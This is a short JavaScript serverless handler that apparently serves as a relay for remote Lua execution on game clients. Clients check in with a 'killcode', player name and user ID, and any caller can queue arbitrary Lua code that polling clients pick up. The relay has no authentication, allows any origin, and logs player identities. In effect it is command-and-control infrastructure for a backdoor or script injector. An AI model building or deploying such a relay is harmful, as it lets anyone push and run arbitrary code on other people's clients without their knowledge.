let commands = {}; // key = killcode, value = { lua: "code here" }

export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');

    const { killcode, player, userid, lua } = req.query;

    // Presence update
    if (player && userid && killcode) {
        console.log(`[Presence] ${player} (${userid}) with killcode ${killcode} is online`);
    }

    // Inject Lua code
    if (lua && killcode) {
        commands[killcode] = { lua }; // store only latest
        console.log(`[Lua queued] ${killcode}: ${lua}`);
        res.status(200).json({ status: "ok", message: "Lua sent" });
        return;
    }

    // Player polling
    if (killcode) {
        const cmd = commands[killcode] || {};
        commands[killcode] = {}; // consume immediately
        res.status(200).json(cmd);
        return;
    }

    res.status(200).json({ status: "ok" });
}
